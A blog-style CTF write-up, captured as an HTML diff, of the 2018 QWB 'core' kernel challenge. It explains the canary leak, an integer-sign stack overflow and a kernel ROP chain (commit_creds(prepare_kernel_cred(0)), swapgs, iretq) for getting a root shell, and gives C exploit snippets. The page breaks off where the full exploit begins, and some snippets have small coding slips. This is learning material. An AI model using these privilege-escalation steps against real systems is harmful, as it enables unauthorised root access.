@@ -1,0 +1,571 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="learning" />
+
+
+<link rel="canonical" href="http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/">
+
+
+
+  <title>
+强网杯2018_core - kernel |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">强网杯2018_core
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-05-01 18:14:39">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-05-01T18:14:39+08:00">2022-05-01</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>8.9k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>8 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitf0kl1j20zk0m87fe.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/kernel/" itemprop="item" rel="index" title="In kernel"><span itemprop="name">kernel</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="2018强网杯core作为kernel学习开始的记录栈溢出ret2rop"><a class="markdownIt-Anchor" href="#2018强网杯core作为kernel学习开始的记录栈溢出ret2rop">#</a> 2018 强网杯 core，作为 kernel 学习开始的记录，栈溢出，ret2rop</h1>
+<h2 id="前置zhishi"><a class="markdownIt-Anchor" href="#前置zhishi">#</a> 前置 zhishi</h2>
+<h2 id="1题目环境"><a class="markdownIt-Anchor" href="#1题目环境">#</a> 1. 题目环境</h2>
+<p>题目保护环境有两类，一类可执行文件的保护机制，一类是文件系统驱动内核的保护机制</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/kernel/<span class="number">2018</span>qwb_core/give_to_player$ checksec core.ko</span><br><span class="line">[*] <span class="string">&#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/core.ko&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span><br><span class="line">    </span><br><span class="line"> start.sh:       </span><br><span class="line">    qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=<span class="number">1</span> quiet kaslr<span class="string">&quot; \</span></span><br><span class="line"><span class="string">-s  \</span></span><br><span class="line"><span class="string">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span></span><br><span class="line"><span class="string">-nographic  \</span></span><br><span class="line"><span class="string">~                  </span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里开启了 kaslr 保护。</p>
+<h2 id="2"><a class="markdownIt-Anchor" href="#2">#</a> 2.</h2>
+<h3 id="canary"><a class="markdownIt-Anchor" href="#canary">#</a> canary</h3>
+<p>core.ko 开启了 canary，我们需要泄露他，进而构造 rop</p>
+<h3 id="kaslr"><a class="markdownIt-Anchor" href="#kaslr">#</a> kaslr</h3>
+<p>kaslr 类似与用户 pwn 的 aslr 或者 pie，一种地址偏移技术。如果我们可以获取 vmlinux_base 就可以绕过这个，执行其他函数。</p>
+<p>获取方式:head /proc/kallsyms 1,startup 对应的地址就是基址</p>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/8fbf9fb6608de56c46b546cc63017967.png" alt="img"></p>
+<h3 id="core_base"><a class="markdownIt-Anchor" href="#core_base">#</a> core_base</h3>
+<p>驱动加载地址，查看方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/modules</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/devices</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms</span><br><span class="line"></span><br><span class="line">lsmod</span><br><span class="line"></span><br><span class="line">dmesg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">core 16384 0 - Live 0xffffffffc02aa000 (O)</span><br></pre></td></tr></table></figure>
+<h2 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析">#</a> 题目分析</h2>
+<p>core.ko 就是我们需要利用的漏洞驱动</p>
+<h3 id="core_ioctl"><a class="markdownIt-Anchor" href="#core_ioctl">#</a> #core_ioctl</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 fd, <span class="type">int</span> idx, __int64 user_buf)</span><span class="comment">//fd是设备对应的文件描述符</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( idx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(user_buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = user_buf;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(user_buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据我们的传参实现三种功能， case 0x6677889C: 实现我们控制 off 全局变量</p>
+<h3 id="core_read"><a class="markdownIt-Anchor" href="#core_read">#</a> core_read</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;buf[off], <span class="number">64LL</span>);   <span class="comment">// 栈任意地址读</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>控制 off 后，我们就可一计算 buf 与 canary 的编译，然后通过 copy_to_user 将 canary 泄露出来。</p>
+<h3 id="core_copy_func"><a class="markdownIt-Anchor" href="#core_copy_func">#</a> core_copy_func</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传入负数就可以绕过检查，然后实现对 v2 的溢出。</p>
+<h3 id="core_write"><a class="markdownIt-Anchor" href="#core_write">#</a> core_write</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 _buf, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, _buf, size) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)size;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将数据写入内核全局变量 name 中。</p>
+<p>1、通过 /tmp/kallsyms 文件获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出所需 gadget 地址。2、对全局变量 off 赋值 0x40，通过 core_read 函数获得 canary 的值。3、构建好 ropchain，使用 core_write 函数将 ropchain 复制到内核态中 4、通过 core_copy_func 函数中的数值溢出造成的栈溢出漏洞，将 ropchain 放入栈中，退出函数时完成提权并返回用户态 getrootshell。</p>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2>
+<p>kernel rop 相较于用户态 rop 的不同点吧。在用户态中我们的目的是为了获得 shell，也就是令程序执行诸如 system (&quot;/bin/sh&quot;) 一类的函数，然而到了 kernel pwn 中我们的目的从原先的 getshell 变成了提权，也就是执行 commit_creds (prepare_kernel_cred (0)) 函数，并且执行完提权函数以后我们需要从内核态返回到用户态执行 system (&quot;/bin/sh&quot;) 获取 root 权限的 shell 才可以，所以在我看来 kernel rop 变得无非就是两步：执行提权函数，返回用户态获取 rootshell。从内核态返回用户态所需要用到的 swapgs 指令与 iretq 指令，前者是在从用户态进入内核态时，通过交换 IA32_KERNEL_GS_BASE 与 IA32_GS_BASE 值，从而得到 kernel 数据结构块，而从内核态变回用户态时需要将原先用户态的信息再交换回来。iretq 指令则用来恢复用户态的 cs、ss、rsp、rip、rflags 的信息。其具体布局如下所示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------+			-----lower</span><br><span class="line">|    RIP    |</span><br><span class="line">+-----------+</span><br><span class="line">|    CS     |</span><br><span class="line">+-----------+</span><br><span class="line">|   rflags  |</span><br><span class="line">+-----------+</span><br><span class="line">|    RSP    |</span><br><span class="line">+-----------+</span><br><span class="line">|    SS     |			-----higher</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+<p>在计算内核 gadget 地址的时候我们使用 ropper 得到的 gadget 地址需要加上 offset 才是真实地址，这个和用户态的一样很好理解，而这个 offset 的获取办法，因为程序将函数地址导入到了 /tmp/kallsyms 中，我们我们可以 cat 出函数的真实地址，然后减去函数的 textoffset，就得到了 vmlinux_base. 而刚才所说的 offset 就是 vmlinux_base 减去 raw_vmlinux_base，即 0xffffffff81000000 的值。这题我们可以直接获取 start_up64</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/kernel/<span class="number">2018</span>qwb_core/give_to_player$ checksec vmlinux</span><br><span class="line">[*] <span class="string">&#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/vmlinux&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.8</span></span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0xffffffff81000000</span>)</span></span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="获取vmlinux_base"><a class="markdownIt-Anchor" href="#获取vmlinux_base">#</a> 获取 vmlinux_base</h3>
+<p>打开 /tmp/kallsyms，获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出 gadget 的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetAddress</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="type">char</span> *ptr;									<span class="comment">//stroull 的结束符号</span></span><br><span class="line"> <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> FILE* fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);			<span class="comment">//打开文件</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (!fd) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-] ERROR.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), fd)) &#123;			<span class="comment">//文件数据会进入缓存，然后再呗拷贝到buf，所以，buf会更新。</span></span><br><span class="line">  <span class="keyword">if</span> (commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+] Find: commit_creds: 0x%llx\n[+] Find: prepare_kernel_cred: 0x%llx\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;			<span class="comment">//string.h库的字符串比较函数，返回字串的位置指针</span></span><br><span class="line">   commit_creds = strtoull(buf, ptr, <span class="number">16</span>);		<span class="comment">//找到了地址，将地址转为unsigned long long </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">   prepare_kernel_cred = strtoull(buf, ptr, <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*实例</span></span><br><span class="line"><span class="comment">/ # cat /tmp/kallsyms | grep commit_creds</span></span><br><span class="line"><span class="comment">ffffffffba29c8e0 T commit_creds</span></span><br><span class="line"><span class="comment">/ # </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>#返回用户态的准备，我们最终要返回用户太执行 system (’/bin/sh’)，从你内核太返回的时候，iretq 会恢复某些寄存器的值。所以我们需要提前保存这些值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SaveStatus</span><span class="params">()</span> &#123;</span><br><span class="line"> __asm__(</span><br><span class="line">  <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">  <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">  <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">  <span class="string">&quot;pushf;&quot;</span>						<span class="comment">//所有的16位标志寄存器入栈</span></span><br><span class="line">  <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里才用汇编内联，将数据保存到全局变量中 user_cs， user_ss, user_sp,</p>
+<p>core.ko 一个外设，但是再 linux 中，万物皆文件，所以只需要访问 /proc/core。</p>
+<p>但是如何实现用户访问与内核的转换的呢？ioctl 函数提供响应的接口。设备对应的是 core_ioctl 函数。</p>
+<p>首先我们要泄露 canary，通过分析，我们得知，buf 与 canary 的偏移量是 0x40，core_read 函数会把 buf 拷贝到我们的 user_buf 中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ioctl(fd, CORE_OFF, <span class="number">0x40</span>);			<span class="comment">//read canary to buf on kernel stack</span></span><br><span class="line"> ioctl(fd, <span class="number">0x6677889B</span>, user_buf); <span class="comment">//canary in buf.copy it to user_buf that we can control.</span></span><br></pre></td></tr></table></figure>
+<p>下面我们就要构造 rop, 首先填充 v2 的八字节以及 canary，然后就是布置 gadget。说明一点，commit_creds (prepare_kernel_cred (0)）是在内核态执行的，只有在返回用户态的时候（也就是我们执行完了提权，才需要布置额外的寄存器的数据）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">8</span>;</span><br><span class="line"><span class="type">char</span> rop[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">rop[i++] = canary;</span><br><span class="line">rop[i++] = <span class="number">0</span>;					<span class="comment">//覆盖rbp</span></span><br><span class="line">rop[i++] = pop_rdi;			<span class="comment">//rip </span></span><br><span class="line">rop[i++] = <span class="number">0</span>;					<span class="comment">//rdi=0</span></span><br><span class="line">rop[i++] = prepare_kernel_cred;	<span class="comment">//执行prepare_kernel_cred</span></span><br><span class="line">rop[i++] = pop_rdx;				</span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = mov_rdi_rax;			<span class="comment">//将prepare_kernel_cred的返回值作为commit_creds的参数。mov_rdi_rax,jmp rdx.</span></span><br><span class="line"><span class="comment">//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span></span><br><span class="line">rop[i++] = swapgs;					<span class="comment">//gadget 是swapgs ;popfq;ret,</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = iretq;					</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)GetShell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="完整的exp"><a class="markdownIt-Anchor" href="#完整的exp">#</a> 完整的 exp</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 